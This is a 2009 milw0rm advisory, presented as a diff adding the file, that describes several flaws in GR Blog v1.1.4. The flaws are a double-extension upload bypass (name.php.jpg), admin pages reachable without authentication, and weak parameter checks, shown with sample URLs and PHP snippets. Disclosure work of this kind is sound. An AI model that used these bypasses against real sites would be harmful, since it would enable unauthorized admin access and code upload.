@@ -1,0 +1,67 @@
+GR Blog v1.1.4 (Upload/Bypass) Multiple Remote Vulnerabilities
+ 
+Author: Jose Luis Gongora Fernandez
+        (a.k.a) JosS <sys-project[at]hotmail.com>
+
+Web:    http://hack0wn.com/
+ 
+/*************************/
+TEST ON VERSION GR Blog v1.1.4, (in my localhost)
+Download : http://sirini.net/grboard/board.php?id=grblog&articleNo=43
+/*************************/
+ 
+[+] Remote File Upload:
+ 
+ /admin/admin_upload.php (simple bypass)
+ upload --> name.php.jpg
+ 
+ PATH example: /data/2009/02/04/name.php.jpg
+ 
+ 
+ --------------
+ files: /admin
+ 
+[+] SIMPLE bypass:
+ 
+ admin_user.php
+ admin_post.php
+ admin_all.php
+ more files...
+ 
+ !xpl: you enter in any files
+ 
+[+] GET bypass:
+ 
+ admin_modify_comment.php
+ --
+ <?php
+ @header('Content-Type: text/html; charset=utf-8');
+ if(array_key_exists('uid', $_GET) && $_GET['uid']) $uid = $_GET['uid'];
+ else exit();
+ --
+ !xpl: http://localhost/blog/admin/admin_modify_comment.php?uid=1
+ 
+ more files...
+ 
+[+] POST bypass:
+ 
+ admin_category.php
+ --
+ <?php
+ if(array_key_exists('categoryName', $_POST) && $_POST['categoryName'])
+ --
+ !xpl: --
+ 
+ admin_insert.php
+ --
+ <?php
+ $e = true;
+ if(array_key_exists('postStart', $_POST) && $_POST['postStart'])
+ --
+ !xpl: --
+ 
+ more files...
+ 
+ __h0__
+
+# milw0rm.com [2009-02-04]
